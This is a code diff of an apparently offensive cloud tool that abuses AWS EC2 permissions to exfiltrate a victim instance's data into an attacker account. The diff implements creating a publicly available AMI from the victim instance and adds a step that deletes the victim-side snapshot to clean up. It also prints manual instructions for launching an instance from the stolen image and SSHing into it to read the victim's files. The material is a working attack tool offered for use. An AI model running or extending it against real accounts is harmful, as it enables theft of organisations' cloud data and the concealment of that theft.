@@ -22,7 +22,7 @@
 #   Abuses:
 #       ec2:CreateImage
 #
-#   NOT IMPLEMENTED YET.
+#   NOT FULLY IMPLEMENTED YET.
 #   For this technique, the procedure is following - the script will create an image out of specified victim's EC2 
 #   instance. This image will become publicly available (caution with client sensitive data!). After that, the script
 #   will attempt to create/import public SSH RSA keys to the attacker's account and then create an EC2 instance using that
@@ -277,6 +277,13 @@ class ExfiltrateEC2:
             else:
                 Logger.fail(f"ec2:AttachVolume action on Attacker failed. Exception: {e}")
 
+        try:
+            Logger.out(f"Cleanup. Trying to remove created snapshot ({snapshot['SnapshotId']}) at Victim's estate...")
+            victim_client.delete_snapshot(SnapshotId = snapshot['SnapshotId'])
+            Logger.ok(f"Snapshot removed.")
+        except Exception as e:
+            Logger.fail(f"(That's ok) ec2:DeleteSnapshot action on Victim failed. Exception: {e}")
+
         ssh_command = 'SSH to the attacker\'s EC2 instance\n'
         if attacker_instance_data:
             try:
@@ -328,17 +335,21 @@ To examine exfiltrated data:
 ''')
         return True
 
-    def create_image(self, instance_id):
-        # Step 1: Create image:
-        #         client.create_image(
-        #           InstanceId = "<targeted-instance-id>",
-        #           Name = "some name",
-        #           Description = "some description"
-        #         )
-        #         Returns:
-        #           {
-        #               "ImageId" : "ami-00000000"
-        #           }
+    def create_image(self, instance_id, image_name, image_description):
+        victim_client = self.session['victim'].client('ec2')
+        attacker_client = self.session['attacker'].client('ec2')
+
+        created_image = None
+        try:
+            Logger.out("Step 1: Creating a publicly available AMI image out of specified EC2 instance.")
+            created_image = victim_client.create_image(
+                InstanceId = instance_id,
+                Name = image_name,
+                Description = image_description
+            )
+            Logger.ok(f"AMI Image with name: ({image_name}) created: {created_image['ImageId']}")
+        except Exception as e:
+            Logger.fatal(f"ec2:CreateImage action on Victim failed. Exception: {e}")
 
         # Step 2: Import custom SSH RSA public key
         #          client.import_key_pair(
@@ -369,7 +380,25 @@ To examine exfiltrated data:
         #       
         #   $ ssh ec2-user@1.2.3.4
         #   $ ls -l
-        Logger.fatal("NOT IMPLEMENTED YET.")
+
+        print(f"""
+===============================================================
+[!] REST OF THE EXPLOIT LOGIC HAS NOT BEEN IMPLEMENTED YET.
+===============================================================
+
+[.] You can proceed manually from this point:
+
+    1) Create an EC2 instance in region: {self.region}
+
+    2) Make sure this EC2 instance is being created out of public AMI image with ID:
+        Image ID: {created_image['ImageId']}
+
+    3) Setup SSH keys, Security Groups, etc.
+
+    4) SSH into that machine.
+
+Created EC2 instance's filesystem will be filled with files coming from the exfiltrated EC2.
+""")
 
 def parseOptions(argv):
     global config
@@ -408,6 +437,8 @@ def parseOptions(argv):
         ' This AMI image will then be shared with another AWS account, constituing exfiltration opportunity.'
     createimage = subparsers.add_parser('createimage', help = a)
     createimage.add_argument('--instance-id', help = '(Required) Specifies instance id (i-...) to create an image of.')
+    createimage.add_argument('--image-name', default = "Exfiltrated AMI image", type=str, help = '(Optional) Specifies a name for newly created AMI image. Default: "Exfiltrated AMI image"')
+    createimage.add_argument('--image-desc', default = "Exfiltrated AMI image", type=str, help = '(Optional) Specifies a description for newly created AMI image. Default: "Exfiltrated AMI image"')
 
     b = 'Creates a snapshot of an EBS volume used by an EC2 instance.'\
         ' This snapshot will then be shared with another AWS account, constituing exfiltration opportunity.'
@@ -508,7 +539,7 @@ def main(argv):
 
     if opts.method == 'createimage':
         Logger.info("Abusing ec2:CreateImage...")
-        exp.create_image(opts.instance_id)
+        exp.create_image(opts.instance_id, opts.image_name, opts.image_desc)
 
     elif opts.method == 'createsnapshot':
         Logger.out("Abusing dangerous ec2:CreateSnapshot and ec2:ModifySnapshotAttribute...\n")
